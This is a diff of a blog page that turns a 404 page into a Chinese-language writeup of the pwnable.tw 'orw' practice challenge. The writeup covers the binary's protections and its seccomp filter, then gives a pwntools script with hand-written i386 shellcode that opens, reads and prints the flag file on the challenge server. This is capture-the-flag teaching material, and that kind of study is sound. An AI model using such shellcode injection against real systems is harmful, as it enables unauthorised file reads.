@@ -13,17 +13,24 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://rogerjaytw.github.io/404.html"/>
+    <link rel="canonical" href="https://rogerjaytw.github.io/2025/02/08/pwnable-orw-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="https://rogerjaytw.github.io/404.html">
+        <meta name="description" content="題目出處https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#2  Read the flag from &#x2F;home&#x2F;orw&#x2F;flag. Only open read write syscall are allowed to use. 分析file123┌──(roger㉿kaliroger)-[~&#x2F;ctf&#x2F;pwnable&#x2F;orw]└─$ file orworw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable orw writeup">
+<meta property="og:url" content="https://rogerjaytw.github.io/2025/02/08/Pwnable-orw-writeup/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="題目出處https:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#2  Read the flag from &#x2F;home&#x2F;orw&#x2F;flag. Only open read write syscall are allowed to use. 分析file123┌──(roger㉿kaliroger)-[~&#x2F;ctf&#x2F;pwnable&#x2F;orw]└─$ file orworw">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-02-08T08:41:17.000Z">
+<meta property="article:modified_time" content="2025-02-08T09:21:50.945Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwnable">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
     
     
@@ -36,7 +43,7 @@
     
     <title>
         
-            Page Not Found | Roger&#39;s Blog
+            Pwnable orw writeup | Roger&#39;s Blog
         
     </title>
 
@@ -489,14 +496,229 @@
             <div class="main-content">
 
                 
-                    <div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Pwnable orw writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/favicon.ico">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Roger</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-02-08 16:41:17</span>
+        <span class="mobile">2025-02-08 16:41:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-02-08 17:21:50</span>
+            <span class="mobile">2025-02-08 17:21:50</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Pwnable/">Pwnable</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="題目出處"><a href="#題目出處" class="headerlink" title="題目出處"></a>題目出處</h2><p><a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#2" >https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.</p>
+<p>Only open <code>read</code> <code>write</code> <code>syscall</code> are allowed to use.</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/orw]</span><br><span class="line">└─$ file orw</span><br><span class="line">orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</span><br></pre></td></tr></table></figure></div>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/orw]</span><br><span class="line">└─$ checksec --file=orw</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols        No    0               2      orw</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">200</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>看起來就是把輸入的shellcode執行</p>
+<h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(roger㉿kaliroger)-[~/ctf/pwnable/orw]</span><br><span class="line">└─$ seccomp-tools dump ./orw </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure></div>
+<p>看起來只允許使用<code>open</code> <code>read</code> <code>write</code> syscall </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>就先Open flag-&gt;read-&gt;write，看是要自己寫組合語言還是用pwntools的shellcraft都可以</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ seccomp-tools dump ./orw</span></span><br><span class="line"><span class="comment">#  line  CODE  JT   JF      K</span></span><br><span class="line"><span class="comment"># =================================</span></span><br><span class="line"><span class="comment">#  0000: 0x20 0x00 0x00 0x00000004  A = arch</span></span><br><span class="line"><span class="comment">#  0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span></span><br><span class="line"><span class="comment">#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span></span><br><span class="line"><span class="comment">#  0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span></span><br><span class="line"><span class="comment">#  0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span></span><br><span class="line"><span class="comment">#  0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span></span><br><span class="line"><span class="comment">#  0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span></span><br><span class="line"><span class="comment">#  0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span></span><br><span class="line"><span class="comment">#  0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span></span><br><span class="line"><span class="comment">#  0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span></span><br><span class="line"><span class="comment">#  0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span></span><br><span class="line"><span class="comment">#  0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#/home/orw/flag = 2f686f6d652f6f 72772f66 6c6167</span></span><br><span class="line"><span class="comment">#EAX 是 32 位元寄存器 = 4 bytes ,最多可以存放 8 個十六進制數字</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x0067616c    # lag</span></span><br><span class="line"><span class="string">    push 0x662f7772    # f/wr</span></span><br><span class="line"><span class="string">    push 0x6f2f656d    # o/em</span></span><br><span class="line"><span class="string">    push 0x6f682f2f    # oh//</span></span><br><span class="line"><span class="string">    mov ebx, esp      </span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    xor edx, edx      </span></span><br><span class="line"><span class="string">    mov eax, 5        # sys_open</span></span><br><span class="line"><span class="string">    int 0x80          #syscall</span></span><br><span class="line"><span class="string">    // open(&#x27;/home/orw/flag&#x27;, 0, 0)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov ebx, eax      # fd</span></span><br><span class="line"><span class="string">    mov ecx, esp      # buf</span></span><br><span class="line"><span class="string">    mov edx, 0x40     # count</span></span><br><span class="line"><span class="string">    mov eax, 3        # sys_read</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    // read(fd, buf, 0x40)</span></span><br><span class="line"><span class="string">         </span></span><br><span class="line"><span class="string">    mov edx, 0x40     # count</span></span><br><span class="line"><span class="string">    mov ebx, 1        # stdout</span></span><br><span class="line"><span class="string">    mov ecx, esp      # buf</span></span><br><span class="line"><span class="string">    mov eax, 4        # sys_write</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    // write(1, buf, 0x40)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc2 = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x40</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">0x40</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>,sc)</span><br><span class="line">flag = r.recv()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="避雷"><a href="#避雷" class="headerlink" title="避雷"></a>避雷</h2><ol>
+<li>自己寫組語的時候要注意因為是小端緒所以字串要反過來寫</li>
+</ol>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Pwnable orw writeup</li>
+        <li><strong>Author:</strong> Roger</li>
+        <li><strong>Created at
+                :</strong> 2025-02-08 16:41:17</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-02-08 17:21:50
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/02/08/Pwnable-orw-writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Pwnable/">#Pwnable</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦文章</span>
     </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/02/05/Pwnable-start-writeup/" title="Pwnable start writeup" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Pwnable start writeup" class="!max-w-none">
+  <span class="title">Pwnable start writeup</span>
+</a><a class="recommended-article-item" href="/2025/02/02/在Terminal上寫程式-Neovim/" title="在Terminal上寫程式?!(Neovim)" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="在Terminal上寫程式?!(Neovim)" class="!max-w-none">
+  <span class="title">在Terminal上寫程式?!(Neovim)</span>
+</a><a class="recommended-article-item" href="/2024/11/13/Git漏洞復現/" title="Git漏洞復現，Clone一個項目就能RCE?!" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Git漏洞復現，Clone一個項目就能RCE?!" class="!max-w-none">
+  <span class="title">Git漏洞復現，Clone一個項目就能RCE?!</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推薦文章</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/02/05/Pwnable-start-writeup/" title="Pwnable start writeup" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="Pwnable start writeup" class="!max-w-none">
+  <span class="title">Pwnable start writeup</span>
+</a><a class="recommended-article-item" href="/2025/02/02/在Terminal上寫程式-Neovim/" title="在Terminal上寫程式?!(Neovim)" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="在Terminal上寫程式?!(Neovim)" class="!max-w-none">
+  <span class="title">在Terminal上寫程式?!(Neovim)</span>
+</a></div>
+   </div>
+  </div>
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/02/05/Pwnable-start-writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pwnable start writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Pwnable orw writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%8C%E7%9B%AE%E5%87%BA%E8%99%95"><span class="nav-text">題目出處</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA"><span class="nav-text">IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seccomp"><span class="nav-text">seccomp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%81%BF%E9%9B%B7"><span class="nav-text">避雷</span></a></li></ol>
+
     </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -581,6 +803,23 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
